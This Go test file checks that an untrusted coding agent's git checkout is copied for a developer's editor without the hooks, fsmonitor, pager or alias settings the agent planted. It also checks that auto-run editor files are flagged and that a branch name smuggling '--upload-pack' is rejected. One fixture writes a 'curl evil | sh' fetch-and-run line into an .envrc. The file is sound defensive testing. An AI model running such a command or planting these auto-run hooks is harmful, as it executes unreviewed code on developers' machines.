package hostgit

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// editorRig is a prep whose supervisor copy is opened with a workspace root of
// p.base, so that a destination elsewhere is outside it.
func editorRig(t *testing.T) (*prep, *Repo) {
	t.Helper()
	p := newPrep(t)
	strict := newGit(t, WithWorkspaceRoot(p.base))
	r, err := strict.OpenBare(context.Background(), p.repo.Path())
	if err != nil {
		t.Fatal(err)
	}
	return p, r
}

func TestEditorCopyIsACleanCloneOfTheFetchedTopic(t *testing.T) {
	ctx := context.Background()
	p, r := editorRig(t)
	// The agent plants what it can in its own checkout.
	hook := filepath.Join(p.topic, ".git", "hooks", "post-checkout")
	canary := filepath.Join(p.base, "fired")
	if err := os.MkdirAll(filepath.Dir(hook), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(hook, []byte("#!/bin/sh\n: > '"+canary+"'\n"), 0o700); err != nil { //nolint:gosec // an executable test hook
		t.Fatal(err)
	}
	mustGit(t, p.env, p.topic, "config", "core.fsmonitor", "touch "+canary)
	mustGit(t, p.env, p.topic, "config", "core.pager", "touch "+canary)
	mustGit(t, p.env, p.topic, "config", "alias.evil", "!touch "+canary)

	dest := filepath.Join(t.TempDir(), "editor")
	warn, err := r.EditorCopy(ctx, dest, p.topicBr)
	if err != nil {
		t.Fatal(err)
	}
	if len(warn) != 0 {
		t.Errorf("warnings %v for a topic without auto-run files", warn)
	}
	if got := mustGit(t, p.env, dest, "rev-parse", "--abbrev-ref", "HEAD"); got != p.topicBr {
		t.Errorf("HEAD = %q", got)
	}
	if got, want := mustGit(t, p.env, dest, "rev-parse", "HEAD"), p.rev("refs/heads/"+p.topicBr); got != want {
		t.Errorf("the copy is at %s, the supervisor's topic at %s", got, want)
	}
	// None of the agent's config, hooks or alternates came along.
	cfg := mustGit(t, p.env, dest, "config", "--local", "--list")
	for _, planted := range []string{"fsmonitor", "pager", "alias.evil", "hooksPath"} {
		if strings.Contains(cfg, planted) {
			t.Errorf("the planted %q is in the copy's config:\n%s", planted, cfg)
		}
	}
	if entries, _ := os.ReadDir(filepath.Join(dest, ".git", "hooks")); len(entries) != 0 {
		t.Errorf("the copy has %d hooks", len(entries))
	}
	if _, err := os.Stat(filepath.Join(dest, ".git", "objects", "info", "alternates")); err == nil {
		t.Error("the copy borrows objects from somewhere")
	}
	// What an editor's git extension does: plain git in the copy, nothing fires.
	mustGit(t, p.env, dest, "status", "--short")
	mustGit(t, p.env, dest, "checkout", "--quiet", "--detach", "HEAD")
	if _, err := os.Stat(canary); err == nil {
		t.Error("a planted program ran when plain git was used in the editor copy")
	}
}

// The control: plain git in the agent's own checkout does fire the plant, which
// is why the editor must never be pointed there.
func TestControlThePlantFiresInTheAgentCheckout(t *testing.T) {
	p, _ := editorRig(t)
	canary := filepath.Join(p.base, "fired")
	mustGit(t, p.env, p.topic, "config", "alias.evil", "!touch "+canary)
	mustGit(t, p.env, p.topic, "evil")
	if _, err := os.Stat(canary); err != nil {
		t.Fatal("the control did not fire: the test proves nothing")
	}
}

func TestEditorCopyListsFilesAnEditorActsOn(t *testing.T) {
	ctx := context.Background()
	p, r := editorRig(t)
	if err := os.MkdirAll(filepath.Join(p.topic, ".vscode"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(p.topic, ".vscode", "tasks.json"), []byte(`{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(p.topic, ".envrc"), []byte("curl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	mustGit(t, p.env, p.topic, "add", ".vscode", ".envrc")
	mustGit(t, p.env, p.topic, "commit", "--quiet", "-m", "docs: editor files")
	p.fetch()

	warn, err := r.EditorCopy(ctx, filepath.Join(t.TempDir(), "editor"), p.topicBr)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{".vscode/tasks.json", ".envrc"}; !reflect.DeepEqual(warn, want) {
		t.Errorf("warnings = %v, want %v", warn, want)
	}
}

func TestEditorCopyRefreshesByFastForwardOnly(t *testing.T) {
	ctx := context.Background()
	p, r := editorRig(t)
	dest := filepath.Join(t.TempDir(), "editor")
	if _, err := r.EditorCopy(ctx, dest, p.topicBr); err != nil {
		t.Fatal(err)
	}

	p.commitFile("more.txt", "docs: more")
	p.fetch()
	if _, err := r.EditorCopy(ctx, dest, p.topicBr); err != nil {
		t.Fatalf("a fast-forward refresh: %v", err)
	}
	if got, want := mustGit(t, p.env, dest, "rev-parse", "HEAD"), p.rev("refs/heads/"+p.topicBr); got != want {
		t.Errorf("after the refresh the copy is at %s, want %s", got, want)
	}

	// The developer commits in the copy; the agent's branch moves too.
	if err := os.WriteFile(filepath.Join(dest, "mine.txt"), []byte("mine\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	mustGit(t, p.env, dest, "add", "mine.txt")
	mustGit(t, p.env, dest, "commit", "--quiet", "-m", "docs: mine")
	mine := mustGit(t, p.env, dest, "rev-parse", "HEAD")
	p.commitFile("again.txt", "docs: again")
	p.fetch()
	if _, err := r.EditorCopy(ctx, dest, p.topicBr); !errors.Is(err, ErrCopyDiverged) {
		t.Fatalf("a diverged copy = %v, want ErrCopyDiverged", err)
	}
	if got := mustGit(t, p.env, dest, "rev-parse", "HEAD"); got != mine {
		t.Errorf("the developer's commit was overwritten: HEAD is %s", got)
	}
}

func TestEditorCopyIsNeverInsideTheWorkspaceRoot(t *testing.T) {
	ctx := context.Background()
	p, r := editorRig(t)
	for name, dest := range map[string]string{
		"the agent's own checkout": p.topic,
		"below the root":           filepath.Join(p.base, "editor"),
		"a link into the root":     "",
	} {
		if name == "a link into the root" {
			link := filepath.Join(t.TempDir(), "link")
			if err := os.Symlink(p.base, link); err != nil {
				t.Skip(err)
			}
			dest = filepath.Join(link, "editor")
		}
		if _, err := r.EditorCopy(ctx, dest, p.topicBr); !errors.Is(err, ErrInsideWorkspace) {
			t.Errorf("%s: EditorCopy = %v, want ErrInsideWorkspace", name, err)
		}
	}
	if _, err := r.EditorCopy(ctx, "relative/dir", p.topicBr); !errors.Is(err, ErrBadPath) {
		t.Errorf("a relative destination = %v", err)
	}
	if _, err := r.EditorCopy(ctx, filepath.Join(t.TempDir(), "x"), "--upload-pack=x"); !errors.Is(err, ErrBadBranch) {
		t.Errorf("a branch named like an option = %v", err)
	}
}

func TestEditorCopyRefusesADirectoryThatIsNotItsCopy(t *testing.T) {
	ctx := context.Background()
	p, r := editorRig(t)
	other := filepath.Join(t.TempDir(), "other")
	if err := os.MkdirAll(other, 0o750); err != nil {
		t.Fatal(err)
	}
	mustGit(t, p.env, other, "init", "--quiet")
	if _, err := r.EditorCopy(ctx, other, p.topicBr); !errors.Is(err, ErrNotACopy) {
		t.Errorf("an unrelated repository = %v, want ErrNotACopy", err)
	}
}
